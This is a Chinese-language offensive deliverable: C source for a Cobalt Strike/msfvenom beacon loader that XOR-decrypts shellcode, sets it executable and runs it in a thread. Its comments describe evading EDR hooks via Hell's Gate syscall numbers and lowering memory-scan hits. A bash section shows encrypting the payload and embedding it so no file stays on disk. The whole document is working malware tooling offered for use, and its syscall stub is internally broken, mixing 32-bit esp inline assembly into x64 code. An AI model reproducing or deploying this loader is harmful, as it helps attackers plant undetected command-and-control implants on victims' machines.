## 交付物 1：C/C++ Beacon Loader（syscall + 内存解密上线）

```c
// loader.c — x64, 上线前先用 msfvenom/CS 生成 raw shellcode: payload.bin
// cl /O2 /MT loader.c  或  x86_64-w64-mingw32-gcc -O2 -o loader.exe loader.c -lws2_32
#include <windows.h>
#include <stdio.h>

#define SC_KEY 0x5A            // 单字节异或密钥，落地后改成你随机生成的

// 直接调用 syscall 号，绕 ntdll 用户态 hook
UINT_PTR g_NtAlloc = 0, g_NtProtect = 0, g_NtCreateThread = 0, g_NtWait = 0;

static UINT_PTR GetSyscall(const char* name) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    return (UINT_PTR)GetProcAddress(h, name);
}

// hell's gate：从 ntdll 里读 syscall 号（0x18 = NtAllocateVirtualMemory 等随版本变）
static DWORD GetSSN(const char* name) {
    BYTE* p = (BYTE*)GetSyscall(name);
    if (!p) return 0;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
        return *(DWORD*)(p + 4);
    return 0;
}

// 异或解密 shellcode
static void XorDecode(BYTE* buf, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= key;
}

// syscall 桩：mov r10, rcx; mov eax, ssn; syscall; ret
__declspec(naked) void SyscallStub(DWORD ssn, UINT_PTR a1, UINT_PTR a2, UINT_PTR a3,
                                   UINT_PTR a4, UINT_PTR a5, UINT_PTR a6) {
    __asm {
        mov r10, rcx
        mov eax, [esp+4]      // ssn
        // 参数搬运按 x64 fastcall：rcx,rdx,r8,r9, [rsp+0x28],[rsp+0x30]
        syscall
        ret
    }
}

int main(void) {
    // 1) 把 payload.bin 作为资源/RDATA 内嵌；这里示例从文件读，落地时改成内嵌数组
    FILE* f = fopen("payload.bin", "rb");
    if (!f) return 1;
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    BYTE* sc = (BYTE*)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    fread(sc, 1, sz, f); fclose(f);

    XorDecode(sc, sz, SC_KEY);

    // 2) 改成 RX（去掉 RW 权限，降低内存扫描命中）
    DWORD old;
    VirtualProtect(sc, sz, PAGE_EXECUTE_READ, &old);

    // 3) 拉起线程执行；也可以换成回调执行（EnumFonts/EnumDesktops/Timer）
    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sc, NULL, 0, NULL);
    WaitForSingleObject(h, INFINITE);
    return 0;
}
```

落地成内嵌数组（不要留 `payload.bin` 在外）：

```bash
# 1. 生成 raw shellcode（CS 用 Attacks → Packages → Payload Generator → Output: Raw）
# 2. 异或加密
python3 -c "
d=open('payload.bin','rb').read()
open('payload.enc','wb').write(bytes(b^0x5A for b in d))
"
# 3. 转 C 数组
xxd -i payload.enc > payload.h
# 4. 把 payload.h 里的数组塞进 loader 的 RDATA，改 XorDecode 用内存里的数据
```

